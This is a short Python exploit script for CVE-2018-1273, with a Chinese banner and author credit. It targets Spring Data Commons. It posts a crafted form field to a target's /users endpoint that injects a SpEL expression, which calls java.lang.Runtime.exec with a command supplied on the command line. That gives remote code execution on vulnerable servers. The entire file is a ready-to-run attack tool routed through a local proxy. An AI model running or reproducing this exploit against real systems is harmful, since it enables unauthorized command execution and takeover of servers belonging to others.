import json
import re
import sys
import requests



def title():
    print("[-------------------------------------------------------------]")
    print("[--------------        Spring代码执行      ---------------]")
    print("[--------               CVE-2018-1273             ----------]")
    print("[--------    use:python3 CVE-2018-1273.py url cmd --------]")
    print("[--------              Author:鸣蜩十四           ------------]")
    print("[-------------------------------------------------------------]")

def main(url,cmd) :
    if (len(sys.argv)==3):
        poc(url,cmd)
    else :
        print("Example: \n   python3 " + sys.argv[0] + " url" + " cmd" + "\n")

def poc(url,cmd) :
    session = requests.Session()
    response = session.get(url)
    headers={
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    'Accept-Language': "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    'Accept-Encoding': "gzip, deflate",
    'Content-Type': "application/x-www-form-urlencoded",
    'Content-Length': "97",
    'Cookie': "sidebar_collapsed=false",
    'X-Forwarded-For': "127.0.0.2",
    'Connection': "keep-alive",
    'cache-control': "no-cache"
    }
    payload = 'username[# this.getClass().forName("java.lang.Runtime").getRuntime().exec("'+cmd+'")]=&password=&repeatedPassword='

    proxies = {
        "http":"http://127.0.0.1:8081"

    }
    url = str(url) + "/users?page=&size=5"
    a = requests.post(headers=headers,url=url,data=payload,timeout=30,proxies=proxies)
    print("查看结果")



if __name__ == "__main__" :
    title()
    url = sys.argv[1]
    cmd = sys.argv[2]
    main(url,cmd)
